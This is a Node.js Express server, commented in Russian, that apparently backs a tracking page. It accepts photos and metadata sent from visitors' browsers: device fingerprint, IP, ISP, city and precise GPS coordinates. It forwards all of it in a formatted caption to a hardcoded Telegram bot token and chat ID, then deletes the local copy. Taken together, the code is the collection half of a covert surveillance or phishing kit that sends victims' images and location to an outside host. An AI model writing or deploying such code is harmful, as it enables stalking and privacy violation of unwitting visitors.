const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const axios = require('axios');
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 3000;

// ===== TELEGRAM НАСТРОЙКИ =====
const TELEGRAM_TOKEN = '8349177937:AAHKmVLvSCK16t1HnYjPbzE0svFu73TnjvE';
const TELEGRAM_CHAT_ID = '7438864168';

// ===== СОЗДАЁМ ПАПКУ =====
const uploadDir = './uploads';
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir);
}

// ===== НАСТРОЙКА MULTER =====
const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, uploadDir),
    filename: (req, file, cb) => {
        cb(null, `photo_${Date.now()}.jpg`);
    }
});

const upload = multer({ 
    storage,
    limits: { fileSize: 10 * 1024 * 1024 }
});

// ===== СТАТИКА =====
app.use(express.static('public'));

// ===== ПОЛУЧЕНИЕ IP И ПОРТА =====
function getClientInfo(req) {
    const forwarded = req.headers['x-forwarded-for'];
    let ip = forwarded ? forwarded.split(',')[0].trim() : 
             req.socket.remoteAddress || 
             req.connection.remoteAddress || 
             'unknown';
    
    if (ip.startsWith('::ffff:')) {
        ip = ip.substring(7);
    }
    
    let port = req.socket.remotePort || 
               req.connection.remotePort || 
               'unknown';
    
    const forwardedPort = req.headers['x-forwarded-port'];
    if (forwardedPort) {
        port = forwardedPort;
    }
    
    return { ip, port };
}

// ===== ОТПРАВКА В TELEGRAM =====
async function sendToTelegram(photoPath, metadata, clientInfo) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;
        
        const ts = metadata.timestamp || {};
        const device = metadata.device || {};
        const location = metadata.location || {};
        const ip = metadata.ip || {};
        
        let caption = `📸 НОВОЕ ФОТО\n`;
        caption += `━━━━━━━━━━━━━━━━━\n`;
        caption += `🕐 Время: ${ts.date || 'unknown'} ${ts.time || 'unknown'}\n`;
        caption += `⏱ Точное время: ${ts.ms_full || 'unknown'} ms\n`;
        caption += `🌍 Часовой пояс: ${ts.timezone || 'unknown'}\n`;
        caption += `━━━━━━━━━━━━━━━━━\n`;
        caption += `📱 УСТРОЙСТВО:\n`;
        caption += `  • ОС: ${device.os || 'unknown'}\n`;
        caption += `  • Браузер: ${device.browser || 'unknown'}\n`;
        caption += `  • Платформа: ${device.platform || 'unknown'}\n`;
        caption += `  • Язык: ${device.language || 'unknown'}\n`;
        caption += `  • Экран: ${device.screen?.width || '?'}x${device.screen?.height || '?'}\n`;
        caption += `  • Пиксели: ${device.screen?.pixelRatio || '?'}\n`;
        caption += `  • Память: ${device.memory || '?'} ГБ\n`;
        caption += `  • Ядра: ${device.cores || '?'}\n`;
        caption += `  • Touch: ${device.touchSupport ? '✅' : '❌'}\n`;
        caption += `━━━━━━━━━━━━━━━━━\n`;
        caption += `🌐 IP ИНФОРМАЦИЯ:\n`;
        caption += `  • IP: ${ip.ip || clientInfo.ip || 'unknown'}\n`;
        caption += `  • Порт: ${clientInfo.port || 'unknown'}\n`;
        if (ip.country) caption += `  • Страна: ${ip.country}\n`;
        if (ip.city) caption += `  • Город: ${ip.city}\n`;
        if (ip.isp) caption += `  • Провайдер: ${ip.isp}\n`;
        caption += `━━━━━━━━━━━━━━━━━\n`;
        
        if (location.available) {
            caption += `📍 ГЕОЛОКАЦИЯ:\n`;
            caption += `  • Широта: ${location.latitude?.toFixed(6) || '?'}\n`;
            caption += `  • Долгота: ${location.longitude?.toFixed(6) || '?'}\n`;
            caption += `  • Точность: ${location.accuracy?.toFixed(0) || '?'} м\n`;
            if (location.altitude) caption += `  • Высота: ${location.altitude?.toFixed(1) || '?'} м\n`;
        } else {
            caption += `📍 ГЕОЛОКАЦИЯ: ❌ ${location.error || 'недоступна'}\n`;
        }
        caption += `━━━━━━━━━━━━━━━━━\n`;
        caption += `🔗 Ссылка: ${metadata.url || 'unknown'}\n`;
        caption += `📝 Реферер: ${metadata.referrer || 'direct'}\n`;
        caption += `📸 Фото: ${metadata.photo_taken ? '✅ сделано' : '❌ не получено'}`;

        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('caption', caption);
        formData.append('parse_mode', 'HTML');
        
        if (photoPath && fs.existsSync(photoPath)) {
            formData.append('photo', fs.createReadStream(photoPath));
        } else {
            const textUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
            const textData = new FormData();
            textData.append('chat_id', TELEGRAM_CHAT_ID);
            textData.append('text', caption);
            textData.append('parse_mode', 'HTML');
            
            const response = await axios.post(textUrl, textData, {
                headers: { ...textData.getHeaders() },
                timeout: 10000
            });
            console.log('✅ Данные отправлены в Telegram (без фото)');
            return response.data;
        }
        
        const response = await axios.post(url, formData, {
            headers: { ...formData.getHeaders() },
            timeout: 15000
        });
        
        console.log('✅ Фото и данные отправлены в Telegram');
        return response.data;
        
    } catch (err) {
        console.error('❌ Ошибка отправки в Telegram:', err.response?.data || err.message);
        throw err;
    }
}

// ===== ОБРАБОТЧИК =====
app.post('/upload', upload.single('photo'), async (req, res) => {
    try {
        const clientInfo = getClientInfo(req);
        const metadata = req.body.metadata ? JSON.parse(req.body.metadata) : {};
        const photoPath = req.file ? req.file.path : null;
        const filename = req.file ? req.file.filename : null;
        
        console.log(`📸 Получены данные от: ${clientInfo.ip}:${clientInfo.port}`);
        
        await sendToTelegram(photoPath, metadata, clientInfo);
        
        if (photoPath && fs.existsSync(photoPath)) {
            fs.unlink(photoPath, (err) => {
                if (err) console.error('Ошибка удаления файла:', err);
                else console.log('🗑️ Файл удалён');
            });
        }
        
        res.json({ 
            success: true, 
            filename: filename || 'no_photo',
            ip: clientInfo.ip,
            port: clientInfo.port
        });
        
    } catch (err) {
        console.error('Ошибка обработки:', err);
        res.status(500).json({ success: false, error: 'Ошибка обработки' });
    }
});

// ===== КОРЕНЬ =====
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ===== ЗАПУСК =====
app.listen(PORT, () => {
    console.log(`🚀 Сервер запущен на порту ${PORT}`);
    console.log(`🤖 Telegram: ${TELEGRAM_TOKEN ? '✅ настроен' : '❌ не настроен'}`);
});